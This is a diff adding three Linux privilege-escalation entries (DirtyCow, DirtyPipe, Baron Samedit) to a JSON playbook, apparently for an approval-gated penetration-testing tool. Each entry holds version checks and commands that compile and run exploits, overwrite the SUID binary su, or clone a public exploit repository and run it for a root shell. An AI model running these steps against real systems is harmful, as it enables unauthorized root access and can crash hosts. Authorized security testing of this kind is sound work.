@@ -1040,6 +1040,149 @@
           "note": "A permissive service-account token lets you create a privileged pod that mounts the host filesystem."
         }
       ]
+    },
+    {
+      "id": "dirtycow",
+      "title": "DirtyCow Copy-on-Write Race (CVE-2016-5195)",
+      "hypothesis": "DirtyCow is a race condition in the Linux kernel copy-on-write handling, present on kernels below 4.8.3, that lets an unprivileged user write to files they should only be able to read. The common variants either overwrite /etc/passwd to add a root user or hijack a SUID binary, both reaching root. It is a post-foothold local escalation, and it can be unstable, so snapshot the box if you can. Check the kernel version, compile the staged exploit, and run it.",
+      "tool": "gcc",
+      "tools": [
+        "gcc",
+        "uname"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "escalate",
+      "requires_any": [
+        "foothold.linux",
+        "access.shell",
+        "host.kernel"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 36,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "root via the copy-on-write race on a kernel below 4.8.3",
+      "does_not_prove": "anything on a patched kernel, and the race can crash the host",
+      "report": {
+        "finding": "DirtyCow kernel copy-on-write privilege escalation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"
+      ],
+      "commands": [
+        {
+          "tool": "uname",
+          "run": "uname -r",
+          "note": "DirtyCow affects kernels below 4.8.3; confirm before risking an unstable exploit."
+        },
+        {
+          "tool": "gcc",
+          "run": "gcc -pthread dirtycow.c -o /tmp/dcow -lcrypt && /tmp/dcow",
+          "note": "Compile and run on the target; the /etc/passwd variant then lets you su to the new root user."
+        }
+      ]
+    },
+    {
+      "id": "dirtypipe",
+      "title": "DirtyPipe Pipe Page-Cache Write (CVE-2022-0847)",
+      "hypothesis": "DirtyPipe is a Linux kernel flaw on versions 5.8 through 5.16.11 that lets an unprivileged user write into the page cache of a file they can only read, including read-only and SUID binaries. Overwriting a SUID binary like su with a small payload gives an immediate root shell. It is a post-foothold local escalation and is more reliable than DirtyCow. Confirm the kernel, compile the staged exploit, and point it at a SUID binary.",
+      "tool": "gcc",
+      "tools": [
+        "gcc",
+        "uname"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "escalate",
+      "requires_any": [
+        "foothold.linux",
+        "access.shell",
+        "host.kernel"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 37,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "root by overwriting a SUID binary on a kernel between 5.8 and 5.16.11",
+      "does_not_prove": "anything on a patched kernel outside that range",
+      "report": {
+        "finding": "DirtyPipe kernel page-cache privilege escalation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"
+      ],
+      "commands": [
+        {
+          "tool": "uname",
+          "run": "uname -r",
+          "note": "DirtyPipe affects kernels 5.8 through 5.16.11; confirm the version first."
+        },
+        {
+          "tool": "gcc",
+          "run": "gcc dirtypipe.c -o /tmp/dp && /tmp/dp /usr/bin/su",
+          "note": "The exploit backs up and rewrites the SUID binary, then hands you a root shell; it restores the original after."
+        }
+      ]
+    },
+    {
+      "id": "baron-samedit",
+      "title": "Sudo Baron Samedit Heap Overflow (CVE-2021-3156)",
+      "hypothesis": "Baron Samedit is a heap overflow in sudo itself, present on sudo below 1.9.5p2, that any local user can trigger regardless of their sudo rights, because it is reached through sudoedit before any permission check. A public exploit auto-detects the memory offsets and spawns a root shell. It is a post-foothold escalation that works even when sudo -l shows you nothing. Confirm the version, then run the exploit.",
+      "tool": "sudoedit",
+      "tools": [
+        "sudoedit",
+        "python",
+        "git"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "escalate",
+      "requires_any": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 38,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "root via the sudo heap overflow on sudo below 1.9.5p2, with no sudo rights needed",
+      "does_not_prove": "anything on a patched sudo at or above 1.9.5p2",
+      "report": {
+        "finding": "Sudo Baron Samedit heap overflow privilege escalation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"
+      ],
+      "commands": [
+        {
+          "tool": "sudoedit",
+          "run": "sudo --version | head -1",
+          "note": "Vulnerable at sudo below 1.9.5p2; a quick sudoedit -s crash test also confirms it."
+        },
+        {
+          "tool": "git",
+          "run": "git clone https://github.com/worawit/CVE-2021-3156",
+          "note": "The worawit exploit auto-detects the right offsets for the target."
+        },
+        {
+          "tool": "python",
+          "run": "python3 CVE-2021-3156/exploit_nss.py",
+          "note": "Spawns a root shell; no sudo rights are required for your user."
+        }
+      ]
     }
   ]
 }
